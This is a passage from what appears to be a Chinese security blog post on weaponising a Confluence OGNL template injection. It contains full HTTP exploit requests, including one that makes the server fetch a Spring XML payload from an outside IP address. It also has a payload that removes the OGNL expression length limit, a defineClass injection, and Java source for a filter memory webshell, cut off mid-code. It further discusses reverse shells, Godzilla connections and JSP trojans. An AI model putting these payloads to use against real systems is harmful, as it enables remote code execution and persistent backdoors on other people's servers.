</span>1</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36 Edg/121.0.0.0</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>193</span><br><span class="line"></span><br><span class="line"><span class="language-reasonml">label=aaa\u0027%<span class="number">2</span>b#request.get(\u0027.<span class="module-access"><span class="module"><span class="identifier">KEY_velocity</span>.</span></span>struts2.context\u0027).internal<span class="constructor">Get(\<span class="params">u0027ognl</span>\<span class="params">u0027</span>)</span>.find<span class="constructor">Value(#<span class="params">parameters</span>.<span class="params">poc</span>[0],&#123;&#125;)</span>%<span class="number">2</span>b\u0027&amp;poc=#a=<span class="keyword">new</span> org.springframework.context.support.<span class="constructor">ClassPathXmlApplicationContext(&#x27;<span class="params">http</span>:<span class="operator">/</span><span class="operator">/</span>8.130.24.188:8888<span class="operator">/</span>1.<span class="params">xml</span>&#x27;)</span></span></span><br></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2024/png/32634994/1707673463300-18c9eb7c-997c-4a23-a7af-81097a492859.png#averageHue=%23ab9e82&clientId=u9363bb59-db00-4&from=paste&height=739&id=u1d136b87&originHeight=924&originWidth=1606&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=98374&status=done&style=none&taskId=u4e67c26d-2a49-49ba-ad14-03dc9bd857e&title=&width=1284.8" alt="image.png"><br>这个Poc首先是成立的，然后假如想进一步利用就利用SPEL去注入内存马即可了。<br>exp的模板如下</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span> ?&gt;</span></span><br><span class="line"> <span class="tag">&lt;<span class="name">beans</span> <span class="attr">xmlns</span>=<span class="string">&quot;http://www.springframework.org/schema/beans&quot;</span></span></span><br><span class="line"><span class="tag"><span class="attr">xmlns:xsi</span>=<span class="string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span> </span></span><br><span class="line"><span class="tag"><span class="attr">xmlns:spring</span>=<span class="string">&quot;http://camel.apache.org/schema/spring&quot;</span></span></span><br><span class="line"><span class="tag"> <span class="attr">xmlns:context</span>=<span class="string">&quot;http://www.springframework.org/schema/context&quot;</span></span></span><br><span class="line"><span class="tag"> <span class="attr">xsi:schemaLocation</span>=<span class="string">&quot;http://www.springframework.org/schema/beans </span></span></span><br><span class="line"><span class="string"><span class="tag">http://www.springframework.org/schema/beans/spring-beans.xsd </span></span></span><br><span class="line"><span class="string"><span class="tag">http://camel.apache.org/schema/spring </span></span></span><br><span class="line"><span class="string"><span class="tag">http://camel.apache.org/schema/spring/camel-spring.xsd </span></span></span><br><span class="line"><span class="string"><span class="tag">http://www.springframework.org/schema/context </span></span></span><br><span class="line"><span class="string"><span class="tag">http://www.springframework.org/schema/context/spring-context.xsd&quot;</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;<span class="name">context:property-placeholder</span> <span class="attr">ignore-resource-not-found</span>=<span class="string">&quot;false&quot;</span> <span class="attr">ignore</span></span></span><br><span class="line"><span class="tag"><span class="attr">unresolvable</span>=<span class="string">&quot;false&quot;</span>/&gt;</span></span><br><span class="line"> <span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">&quot;ClassBase64Str&quot;</span> <span class="attr">class</span>=<span class="string">&quot;java.lang.String&quot;</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;<span class="name">constructor-arg</span> </span></span><br><span class="line"><span class="tag"><span class="attr">value</span>=<span class="string">&quot;&lt;base64&gt;&quot;</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;/<span class="name">constructor-arg</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">bean</span>  <span class="attr">class</span>=<span class="string">&quot;#</span></span></span><br><span class="line"><span class="string"><span class="tag"> &#123;T(org.springframework.cglib.core.ReflectUtils).defineClass(&#x27;&lt;classname&gt;&#x27;,T(org.springframework.util.Base64Utils).decodeFromString(ClassBase64Str.to</span></span></span><br><span class="line"><span class="string"><span class="tag"> String()),new javax.management.loading.MLet(new </span></span></span><br><span class="line"><span class="string"><span class="tag">java.net.URL[0],T(java.lang.Thread).currentThread().getContextClassLoader())</span></span></span><br><span class="line"><span class="string"><span class="tag"> ).newInstance().test1()&#125;&quot;</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;/<span class="name">beans</span>&gt;</span></span><br></pre></td></tr></table></figure><p>这样的话我们也可以达到一种武器化。但是既然都出网了，我们为什么不反弹shell然后做后渗透呢？你说得对，这一是一种方法</p><h3 id="0-2-1-2-Agent-Memshell-ReverseShell"><a href="#0-2-1-2-Agent-Memshell-ReverseShell" class="headerlink" title="0.2.1.2 Agent Memshell+ReverseShell"></a>0.2.1.2 Agent Memshell+ReverseShell</h3><p>假如我们通过反弹shell获得了一个confluence权限，那么我们可以注入内存马吗？答案是肯定的，但是既然都拿到了反弹shell，我们当然也是可以直接上C2平台后渗透的，但是有时候有一些特殊的需求，我们是必须需要内存马的。<br>这时候可以使用vagent进行后渗透处理。<br><a href="https://github.com/veo/vagent">https://github.com/veo/vagent</a><br>使用效果如下，我们可以直接进行哥斯拉连接<br><img src="https://cdn.nlark.com/yuque/0/2024/png/32634994/1707673702294-0f55615c-64f0-42f7-8136-ef7131a458ff.png#averageHue=%233f414a&clientId=u9363bb59-db00-4&from=paste&height=638&id=ub0eba9b6&originHeight=797&originWidth=1488&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=559078&status=done&style=none&taskId=u4fcfd5a7-b1b7-4dfb-93ee-b73faef7fae&title=&width=1190.4" alt="image.png"><br>至于agent内存马的原理就可以自行去了解，阅读一下vagent的源码会很有帮助~</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> Map <span class="title function_">targetClasses</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="type">Map</span> <span class="variable">targetClasses</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        <span class="type">Map</span> <span class="variable">targetClassJavaxMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        targetClassJavaxMap.put(<span class="string">&quot;methodName&quot;</span>, <span class="string">&quot;service&quot;</span>);</span><br><span class="line">        <span class="type">List</span> <span class="variable">paramJavaxClsStrList</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ArrayList</span>();</span><br><span class="line">        paramJavaxClsStrList.add(<span class="string">&quot;javax.servlet.ServletRequest&quot;</span>);</span><br><span class="line">        paramJavaxClsStrList.add(<span class="string">&quot;javax.servlet.ServletResponse&quot;</span>);</span><br><span class="line">        targetClassJavaxMap.put(<span class="string">&quot;paramList&quot;</span>, paramJavaxClsStrList);</span><br><span class="line">        targetClasses.put(<span class="string">&quot;javax.servlet.http.HttpServlet&quot;</span>, targetClassJavaxMap);</span><br><span class="line">        <span class="type">Map</span> <span class="variable">targetClassJakartaMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        targetClassJakartaMap.put(<span class="string">&quot;methodName&quot;</span>, <span class="string">&quot;service&quot;</span>);</span><br><span class="line">        <span class="type">List</span> <span class="variable">paramJakartaClsStrList</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ArrayList</span>();</span><br><span class="line">        paramJakartaClsStrList.add(<span class="string">&quot;jakarta.servlet.ServletRequest&quot;</span>);</span><br><span class="line">        paramJakartaClsStrList.add(<span class="string">&quot;jakarta.servlet.ServletResponse&quot;</span>);</span><br><span class="line">        targetClassJakartaMap.put(<span class="string">&quot;paramList&quot;</span>, paramJakartaClsStrList);</span><br><span class="line">        targetClasses.put(<span class="string">&quot;javax.servlet.http.HttpServlet&quot;</span>, targetClassJavaxMap);</span><br><span class="line">        targetClasses.put(<span class="string">&quot;jakarta.servlet.http.HttpServlet&quot;</span>, targetClassJakartaMap);</span><br><span class="line">        <span class="keyword">if</span> (ServerDetector.isWebLogic()) &#123;</span><br><span class="line">            targetClasses.clear();</span><br><span class="line">            <span class="type">Map</span> <span class="variable">targetClassWeblogicMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">            targetClassWeblogicMap.put(<span class="string">&quot;methodName&quot;</span>, <span class="string">&quot;execute&quot;</span>);</span><br><span class="line">            <span class="type">List</span> <span class="variable">paramWeblogicClsStrList</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ArrayList</span>();</span><br><span class="line">            paramWeblogicClsStrList.add(<span class="string">&quot;javax.servlet.ServletRequest&quot;</span>);</span><br><span class="line">            paramWeblogicClsStrList.add(<span class="string">&quot;javax.servlet.ServletResponse&quot;</span>);</span><br><span class="line">            targetClassWeblogicMap.put(<span class="string">&quot;paramList&quot;</span>, paramWeblogicClsStrList);</span><br><span class="line">            targetClasses.put(<span class="string">&quot;weblogic.servlet.internal.ServletStubImpl&quot;</span>, targetClassWeblogicMap);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> targetClasses;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>定义了很多targetclass，然后利用插秧技术直接插入了一段shellcode。非常不错的思路</p><h3 id="0-2-1-3-Windows系统？"><a href="#0-2-1-3-Windows系统？" class="headerlink" title="0.2.1.3 Windows系统？"></a>0.2.1.3 Windows系统？</h3><p>万一是windows系统呢？当然这种可能性很小，confluence一般都是部署在linux服务器上的。那假如是windows服务器，不能反弹shell，我们该怎么做？这里提供一种可能的思路，既然是tomcat部署的，我们直接笨一点，一段段的echo一个jsp木马进去就好了。</p><h2 id="0-2-2-通杀思路"><a href="#0-2-2-通杀思路" class="headerlink" title="0.2.2 通杀思路"></a>0.2.2 通杀思路</h2><p>那万一不出网呢？是不是就歇逼了？当然不是，我们仍然是可以注入内存马的，但在这之前我们需要绕过一些东西。</p><h3 id="0-2-2-1-长度绕过限制"><a href="#0-2-2-1-长度绕过限制" class="headerlink" title="0.2.2.1 长度绕过限制"></a>0.2.2.1 长度绕过限制</h3><p>当我们解析Ognl的时候，我们拿到的不是ognl.Ognl对象，而是ognltool对象，这个对象是默认加了黑名单以及一些过滤处理的。就比如下图中设置了maxLength为200<br><img src="https://cdn.nlark.com/yuque/0/2024/png/32634994/1707674222401-9668482a-0892-4727-ad4f-73ac896a25f4.png#averageHue=%232f323a&clientId=u9363bb59-db00-4&from=paste&height=594&id=uff3ab3f5&originHeight=742&originWidth=1237&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=130487&status=done&style=none&taskId=u80c02de6-2ea1-438e-9906-2cc2818e3fb&title=&width=989.6" alt="image.png"><br>也就是我们的payload始终不能超过200，一旦超过了那么就会报错<br><img src="https://cdn.nlark.com/yuque/0/2024/png/32634994/1707674304079-6d758605-8d01-45cd-8978-2dbb19edd6f5.png#averageHue=%232f323a&clientId=u9363bb59-db00-4&from=paste&height=566&id=ue7d32fa5&originHeight=708&originWidth=1321&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=130021&status=done&style=none&taskId=ub85246b4-c430-4bd8-8d41-1298b55b593&title=&width=1056.8" alt="image.png"><br>这样的话payload就作废了，那么我们不妨先看看这个属性是什么<br><img src="https://cdn.nlark.com/yuque/0/2024/png/32634994/1707674327784-bf44189c-d9f1-4400-820e-a3104c4a867d.png#averageHue=%23292d36&clientId=u9363bb59-db00-4&from=paste&height=146&id=u6fa3fcd6&originHeight=183&originWidth=883&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=22622&status=done&style=none&taskId=u582e4da4-760d-4e50-b973-0da747f1475&title=&width=706.4" alt="image.png"><br>一个静态的static属性，全局检索一番不难发现<br>位于<code>ognl.Ognl#applyExpressionMaxLength</code>是可以设置length的<br><img src="https://cdn.nlark.com/yuque/0/2024/png/32634994/1707674344249-6aced9e4-3775-409f-a312-c78340dd9206.png#averageHue=%23292d36&clientId=u9363bb59-db00-4&from=paste&height=309&id=u7dc1590f&originHeight=386&originWidth=1231&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=80959&status=done&style=none&taskId=u3552ff0a-30f1-4114-9391-91ed3f2588d&title=&width=984.8" alt="image.png"><br>这个属性首先默认在配置文件中出现<br><img src="https://cdn.nlark.com/yuque/0/2024/png/32634994/1707674381090-ea935f24-dfbc-46bb-b7b0-b409f1843316.png#averageHue=%23282c34&clientId=u9363bb59-db00-4&from=paste&height=211&id=u943e859a&originHeight=264&originWidth=940&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=16032&status=done&style=none&taskId=u301a1231-ab56-40e8-9ce6-86e142100b0&title=&width=752" alt="image.png"><br>在8.5.1中为200，在8.5.3是150，当然这都不要紧，因为我们是可以设置length的，我们可以通过调用<code>applyExpressionMaxLength</code>方法达到类似覆盖的效果</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/template/aui/text-inline.vm</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>localhost:8090</span><br><span class="line"><span class="attribute">Pragma</span><span class="punctuation">: </span>no-cache</span><br><span class="line"><span class="attribute">Cache-Control</span><span class="punctuation">: </span>no-cache</span><br><span class="line"><span class="attribute">sec-ch-ua</span><span class="punctuation">: </span>&quot;Not A(Brand&quot;;v=&quot;99&quot;, &quot;Microsoft Edge&quot;;v=&quot;121&quot;, &quot;Chromium&quot;;v=&quot;121&quot;</span><br><span class="line"><span class="attribute">sec-ch-ua-mobile</span><span class="punctuation">: </span>?0</span><br><span class="line"><span class="attribute">sec-ch-ua-platform</span><span class="punctuation">: </span>&quot;Windows&quot;</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span><span class="punctuation">: </span>1</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36 Edg/121.0.0.0</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>190</span><br><span class="line"></span><br><span class="line"><span class="language-reasonml">label=aaa\u0027%<span class="number">2</span>b#request.get(\u0027.<span class="module-access"><span class="module"><span class="identifier">KEY_velocity</span>.</span></span>struts2.context\u0027).internal<span class="constructor">Get(\<span class="params">u0027ognl</span>\<span class="params">u0027</span>)</span>.find<span class="constructor">Value(#<span class="params">parameters</span>.<span class="params">poc</span>[0],&#123;&#125;)</span>%<span class="number">2</span>b\u0027&amp;poc=@ognl.Ognl@apply<span class="constructor">ExpressionMaxLength(20000000)</span></span></span><br></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2024/png/32634994/1707674453804-7b0a8936-ab4b-4b13-a4e4-a5a68228ba08.png#averageHue=%232f3239&clientId=u9363bb59-db00-4&from=paste&height=581&id=ub62fdef2&originHeight=726&originWidth=1802&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=211946&status=done&style=none&taskId=u394367ea-d645-4b1f-b186-f403b530da2&title=&width=1441.6" alt="image.png"><br>可以看到，成功进入该方法设置属性值，第二次访问会发现属性已经被覆盖。<br><img src="https://cdn.nlark.com/yuque/0/2024/png/32634994/1707674484535-a3c74a0a-86db-4880-bc08-bfff0fdef2f4.png#averageHue=%232e3239&clientId=u9363bb59-db00-4&from=paste&height=592&id=u72fa4ba1&originHeight=740&originWidth=1547&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=157893&status=done&style=none&taskId=u8ec49e4c-7101-484c-b9d0-611aaa0cfac&title=&width=1237.6" alt="image.png"></p><h3 id="0-2-2-2-内存马注入"><a href="#0-2-2-2-内存马注入" class="headerlink" title="0.2.2.2 内存马注入"></a>0.2.2.2 内存马注入</h3><p>既然长度限制被我们解决了，那就可以注入内存马了，现在需要绕过的是Ognl内置的EvalChain检测和黑名单，这里我选择直接defineclass。</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/template/aui/text-inline.vm</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>localhost:8090</span><br><span class="line"><span class="attribute">Pragma</span><span class="punctuation">: </span>no-cache</span><br><span class="line"><span class="attribute">Cache-Control</span><span class="punctuation">: </span>no-cache</span><br><span class="line"><span class="attribute">sec-ch-ua</span><span class="punctuation">: </span>&quot;Not A(Brand&quot;;v=&quot;99&quot;, &quot;Microsoft Edge&quot;;v=&quot;121&quot;, &quot;Chromium&quot;;v=&quot;121&quot;</span><br><span class="line"><span class="attribute">sec-ch-ua-mobile</span><span class="punctuation">: </span>?0</span><br><span class="line"><span class="attribute">sec-ch-ua-platform</span><span class="punctuation">: </span>&quot;Windows&quot;</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span><span class="punctuation">: </span>1</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36 Edg/121.0.0.0</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>11331</span><br><span class="line"></span><br><span class="line"><span class="language-stylus">label=aaa\u0027+<span class="selector-id">#request</span><span class="selector-class">.get</span>(\u0027<span class="selector-class">.KEY_velocity</span><span class="selector-class">.struts2</span>.context\u0027)<span class="selector-class">.internalGet</span>(\u0027ognl\u0027)<span class="selector-class">.findValue</span>(<span class="selector-id">#parameters</span><span class="selector-class">.poc</span><span class="selector-attr">[0]</span>,&#123;&#125;)+\u0027&amp;poc=(@org<span class="selector-class">.springframework</span><span class="selector-class">.cglib</span><span class="selector-class">.core</span>.ReflectUtils@<span class="built_in">defineClass</span>(<span class="string">&#x27;ConfluenceFilterMemshell&#x27;</span>,@org<span class="selector-class">.springframework</span><span class="selector-class">.util</span>.Base64Utils@<span class="built_in">decodeFromString</span>(<span class="string">&#x27;&#x27;</span>),@java<span class="selector-class">.lang</span>.Thread@<span class="built_in">currentThread</span>()<span class="selector-class">.getContextClassLoader</span>()))<span class="selector-class">.newInstance</span>()</span></span><br></pre></td></tr></table></figure><p>那么我们还该思考内存马怎么去构造，这里可以直接参考beichen师傅之前的内存马，但是需要做一些微小的变化</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.PrintWriter;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationHandler;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Proxy;</span><br><span class="line"><span class="keyword">import</span> java.util.ArrayList;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ConfluenceFilterMemshell</span> <span class="keyword">extends</span> <span class="title class_">ClassLoader</span> <span class="keyword">implements</span> <span class="title class_">InvocationHandler</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="type">boolean</span> <span class="variable">initialized</span> <span class="operator">=</span> <span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="type">Object</span> <span class="variable">lock</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Object</span>();</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> Class payloadClass;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> String password;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> String key;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">ConfluenceFilterMemshell</span><span class="params">(ClassLoader loader)</span>&#123;</span><br><span class="line">        <span class="built_in">super</span>(loader);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">ConfluenceFilterMemshell</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="keyword">synchronized</span> (lock)&#123;</span><br><span class="line">            <span class="keyword">if</span> (!initialized)&#123;</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    <span class="type">Class</span> <span class="variable">servletRequestListenerClass</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">                    <span class="keyword">try</span> &#123;</span><br><span class="line">                        servletRequestListenerClass = Class.forName(<span class="string">&quot;jakarta.servlet.ServletRequestListener&quot;</span>);</span><br><span class="line">                    &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">                        <span class="keyword">try</span> &#123;</span><br><span class="line">                            servletRequestListenerClass = Class.forName(<span class="string">&quot;javax.servlet.ServletRequestListener&quot;</span>);</span><br><span class="line">                        &#125; <span class="keyword">catch</span> (ClassNotFoundException ex) &#123;</span><br><span class="line"></span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="keyword">if</span> (servletRequestListenerClass!=<span class="literal">null</span>)&#123;</span><br><span class="line">                        addListener(Proxy.newProxyInstance(Thread.currentThread().getContextClassLoader(),<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;servletRequestListenerClass&#125;,<span class="built_in">this</span>),getStandardContext());</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;<span class="keyword">catch</span> (Throwable e)&#123;</span><br><span class="line"></span><br><span class="line">                &#125;</span><br><span class="line">                initialized = <span class="literal">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> Object <span class="title function_">getStandardContext</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">Object</span> <span class="variable">servletActionContextCompatManager</span> <span class="operator">=</span> Class.forName(<span 